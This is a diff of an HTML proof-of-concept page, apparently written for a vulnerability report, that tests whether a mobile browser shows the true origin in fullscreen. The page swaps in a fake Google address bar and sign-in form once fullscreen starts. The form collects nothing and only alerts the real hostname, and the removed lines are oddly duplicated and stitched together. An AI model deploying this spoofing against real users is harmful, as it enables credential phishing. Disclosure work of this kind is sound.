@@ -1,97 +1,102 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<head><style>
+@font-face {
+  font-family: "Optimistic";
+  font-style: normal;
+  font-weight: 400 600;
+  font-display: swap;
+  src: url("/fonts/OptimisticAI_VF_Optimized.woff2") format("woff2");
+}
+@font-face {
+  font-family: "Optimistic Mono";
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url("/fonts/OptimisticMono_W_TextRegular.woff2") format("woff2");
+}
+:where(html) {
+  font-family: "Optimistic", system-ui, sans-serif;
+}
+:where(code, pre, kbd, samp) {
+  font-family: "Optimistic Mono", ui-monospace, monospace;
+}
+</style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Mi Browser Fullscreen Origin Test</title>
 <style>
- body{margin:0;font-family:Roboto,Arial}
- #landing{padding:40px;text-align:center}
- #bluebar{background:#4285f4;color:white;padding:14px;text-align:center;cursor:pointer;font-weight:bold}
- #fakeBrowser{display:none}
- #fakeBar{background:#202124;color:#e8eaed;padding:8px 12px;display:flex;align-items:center;gap:8px;font-size:13px}
- #fakeBar span.lock{color:#8ab4f8}
- #fakeUrl{background:#35363a;border-radius:20px;padding:6px 14px;flex:1}
- #googleBox{width:320px;margin:80px auto;background:white;padding:30px 40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.2);text-align:center}
- input{width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}
- button.next{background:#1a73e8;color:white;border:0;padding:10px;width:100%;border-radius:4px;margin-top:16px}
+body{font-family:Arial;margin:0;background:#f2f2f2}
+.fake-omnibox{display:flex;align-items:center;background:white;padding:10px;border-bottom:1px solid #dadce0;position:sticky;top:0;z-index:10}
+.fake-omnibox .lock{color:#188038;margin-right:8px}
+.fake-omnibox .url{font-size:14px;color:#202124}
+.fake-omnibox .url span{color:#5f6368}
+.login-box{background:white;max-width:360px;margin:40px auto;padding:24px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
+.login-box h2{font-weight:400;font-size:22px;margin:0 0 8px}
+.login-box p{color:#5f6368;font-size:14px}
+.login-box input{width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}
+.login-box button{width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;margin-top:16px;font-size:14px;cursor:pointer}
+#info{white-space:pre-wrap;font-size:12px;color:#666;margin-top:12px;background:#f8f9fa;padding:8px;border-radius:4px;display:none}
+#fsBtn{background:#188038}
 </style>
 </head>
 <body>
 
-<div id="landing">
-  <h2>Welcome</h2>
-  <p>Please login to continue</p>
-  <div id="bluebar" onclick="goFS()">Login to your Google Account!</div>
-  <p style="font-size:12px;color:gray;margin-top:20px">origin: <b id="realOrigin"></b> - ini attacker.io</p>
+<!-- This fake omnibox only shows AFTER fullscreen -->
+<div id="fakeUI" style="display:none">
+  <div class="fake-omnibox">
+    <span class="lock">🔒</span>
+    <div class="url">google.com<span>/signin</span></div>
+  </div>
+  <div class="login-box">
+    <h2>Sign in to your Google Account</h2>
+    <p>Use your Google Account</p>
+    <input placeholder="Email or phone">
+    <input placeholder="Password" type="password">
+    <button onclick="alert(location.hostname + ' says Fake Google - Real origin is: ' + location.hostname)">Next</button>
+    <div id="infoFs"></div>
+  </div>
 </div>
 
-<div id="fakeBrowser">
-  <!-- FAKE ADDRESS BAR -->
-  <div id="fakeBar">
-    <span class="lock">🔒</span>
-    <div id="fakeUrl">https://accounts.google.com/signin/v2/identifier</div>
-    <span>⋮</span>
-  </div>
-  <!-- FAKE GOOGLE LOGIN - sama kayak SS lu -->
-  <div id="googleBox">
-    <div style="font-size:22px"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div>
-    <p>Sign in to your Google<br>Account</p>
-    <input id="email" placeholder="Email or phone">
-    <input id="pass" type="password" placeholder="Password">
-    <button class="next" onclick="pwned()">Next</button>
-    <p style="color:red;font-size:11px;margin-top:12px">Warning: No real accounts here!</p>
-    <p style="font-size:10px;color:gray">© 2025 Google</p>
+<!-- Real UI BEFORE fullscreen -->
+<div id="realUI">
+  <div class="login-box">
+    <h2>Mi Browser Fullscreen Test</h2>
+    <p>This PoC tests missing origin disclosure in fullscreen toast.</p>
+    <p><b>Step 1:</b> Click button below<br><b>Step 2:</b> Check bottom toast - does it show bonex1927.github.io origin?</p>
+    <button id="fsBtn">Login to your Google Account!</button>
+    <div id="info">Ready. Click button to enter fullscreen.<br>Current host: <script>document.write(location.hostname)</script></div>
   </div>
 </div>
 
 <script>
-document.getElementById('realOrigin').innerText = location.host;
+const info = document.getElementById('info');
+const infoFs = document.getElementById('infoFs');
+const realUI = document.getElementById('realUI');
+const fakeUI = document.getElementById('fakeUI');
+const fsBtn = document.getElementById('fsBtn');
 
-async function goFS(){
-  document.getElementById('landing').style.display='none';
-  document.getElementById('fakeBrowser').style.display='block';
-  try{
+fsBtn.onclick = async () => {
+  try {
     await document.documentElement.requestFullscreen();
-  }catch(e){
-    alert("allow fullscreen: "+e)
-  }
-}
-
-function pwned(){
-  // ini yang di SS ke-3 lu: alert dengan origin asli
-  alert("Fake Google - You typed: " + document.getElementById('email').value + "\n\nReal origin: " + location.host + "\n\nThis is NOT google.com, this is "+location.host);
-}
-</script>
-</body>
-</html>    await document.documentElement.requestFullscreen();
-    info.innerText += "\n\n>>> FULLSCREEN AKTIF <<<";
-  } catch(e){
-    alert("Fullscreen error: " + e.message);
+  } catch(e) {
+    alert("Fullscreen blocked: " + e.message);
   }
 };
 
 document.addEventListener('fullscreenchange', () => {
-  if(document.fullscreenElement){
-    info.innerText += "\nToast Yandex harusnya muncul di bawah";
+  if (document.fullscreenElement) {
+    // Enter fullscreen - show fake UI, hide real
+    realUI.style.display = 'none';
+    fakeUI.style.display = 'block';
+    infoFs.innerText = "\n\n>>> FULLSCREEN ACTIVE <<<\nCheck bottom toast. Vulnerable if toast does NOT show: " + location.hostname;
+  } else {
+    // Exit fullscreen
+    realUI.style.display = 'block';
+    fakeUI.style.display = 'none';
+    info.innerText += "\nFullscreen exited: " + new Date().toLocaleTimeString();
   }
 });
 </script>
-
-</body>
-</html>document.getElementById('fsBtn').onclick = async () => {
-  try {
-    await document.documentElement.requestFullscreen();
-    // di Yandex bakal muncul toast bawah, cek ada domainnya gak
-  } catch(e){
-    alert("Fullscreen di-block: " + e);
-  }
-};
-
-// biar tau kapan fullscreen
-document.addEventListener('fullscreenchange', ()=>{
-  document.getElementById('info').innerText += 
-    "\nFullscreen: " + (document.fullscreenElement ? "YA" : "TIDAK");
-});
-</script>
-
-</body>
+<script>(function(){var loc=location.href.replace(/#.*$/,"");var ATTR_NAMES=["data-product-id","data-productid","data-product_id","product-id","productid","product_id","data-source-entity-id","source-entity-id","source_entity_id","data-product","data-metadata","data-meta"];var DATASET_KEYS=["productId","productid","product_id","sourceEntityId","sourceentityid","source_entity_id","product","metadata","meta"];function readProductId(value){if(typeof value!=="string"||value.length===0)return null;if(/^[0-9]{6,}$/.test(value))return value;var match=value.match(/(?:product(?:_|-)?id|source(?:_|-)?entity(?:_|-)?id)["'=:\s]+([0-9]{6,})/i);return match?match[1]:null}function extractProductId(start){for(var node=start;node&&node!==document.body;node=node.parentElement){for(var i=0;i<ATTR_NAMES.length;i++){var attrValue=node.getAttribute&&node.getAttribute(ATTR_NAMES[i]);var attrProductId=readProductId(attrValue);if(attrProductId)return attrProductId}var dataset=node.dataset||null;if(dataset){for(var j=0;j<DATASET_KEYS.length;j++){var dataValue=dataset[DATASET_KEYS[j]];var dataProductId=readProductId(dataValue);if(dataProductId)return dataProductId}}}return null}function isInlineMediaSlotElement(node){return !!(node&&node.getAttribute&&node.getAttribute("data-clippy-inline-media-slot")!==null)}function findInlineMediaSlot(start){for(var node=start;node&&node!==document.body;node=node.parentElement){if(isInlineMediaSlotElement(node))return node}return null}function readInlineMediaUrl(node){if(!node)return null;return node.getAttribute&&((node.getAttribute("data-clippy-inline-media-url")||node.getAttribute("data-url")||node.getAttribute("data_url")))||node.href||null}function stripHash(url){return String(url).replace(/#.*$/,"")}function urlsMatch(a,b){if(!a||!b)return false;try{return stripHash(new URL(a,loc).href)===stripHash(new URL(b,loc).href)}catch(_){return stripHash(a)===stripHash(b)}}function isFirstPartyReelUrl(value){try{var url=new URL(value,loc);if(url.protocol!=="https:")return false;var host=url.hostname.toLowerCase();var supported=host==="instagram.com"||host.endsWith(".instagram.com")||host==="facebook.com"||host.endsWith(".facebook.com");return supported&&/\/reels?\//i.test(url.pathname)}catch(_){return false}}function isInlineMediaUrlClick(node,href){var slot=findInlineMediaSlot(node);if(!slot)return false;var slotUrl=readInlineMediaUrl(slot);if(slotUrl)return urlsMatch(href,slotUrl);return isFirstPartyReelUrl(href)}function findDataHref(start){for(var node=start;node&&node!==document.body;node=node.parentElement){if(node.getAttribute){var href=node.getAttribute("data-href")||node.getAttribute("data-url");if(href)return{href:href,node:node}}}return null}var nativeOpen=window.open;window.open=function(url){if(parent!==window&&typeof url==="string"&&/^https?:\/\//.test(url)){parent.postMessage({type:"ecto:usercontent-link-click",href:url},"*");return null}return nativeOpen?nativeOpen.apply(window,arguments):null};document.addEventListener("click",function(e){var target=e.target instanceof Element?e.target:null;if(!target)return;if(parent===window)return;var a=target.closest?target.closest("a[href]"):null;if(a&&a.href&&/^https?:\/\//.test(a.href)&&a.href.replace(/#.*$/,"")!==loc){if(isInlineMediaUrlClick(a,a.href))return;var productId=extractProductId(target)||extractProductId(a);if(productId){e.preventDefault();parent.postMessage({type:"ecto-artifact-link-click",productId:productId},"*");return}e.preventDefault();parent.postMessage({type:"ecto:usercontent-link-click",href:a.href},"*");return}var dataHref=findDataHref(target);if(dataHref&&/^https?:\/\//.test(dataHref.href)&&dataHref.href.replace(/#.*$/,"")!==loc){if(isInlineMediaUrlClick(dataHref.node,dataHref.href))return;e.preventDefault();parent.postMessage({type:"ecto:usercontent-link-click",href:dataHref.href},"*")}},true)})();</script><script>(function(){var FOCUS_TYPE="ecto:artifact-focus-request";var CLOSE_TYPE="ecto:artifact-close-request";function focusArtifactDocument(){var body=document.body;if(!body)return;try{window.focus();}catch(e){}if(!body.hasAttribute("tabindex"))body.setAttribute("tabindex","-1");try{body.focus({preventScroll:true});}catch(e){try{body.focus();}catch(e2){}}}window.addEventListener("message",function(event){if(event.source!==window.parent)return;var data=event.data;if(!data||typeof data!=="object"||data.type!==FOCUS_TYPE)return;if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",focusArtifactDocument,{once:true});return;}focusArtifactDocument();});window.addEventListener("keydown",function(event){if(event.key!=="Escape")return;window.setTimeout(function(){if(event.defaultPrevented)return;window.parent.postMessage({type:CLOSE_TYPE},"*");},0);});})();</script></body>
 </html>
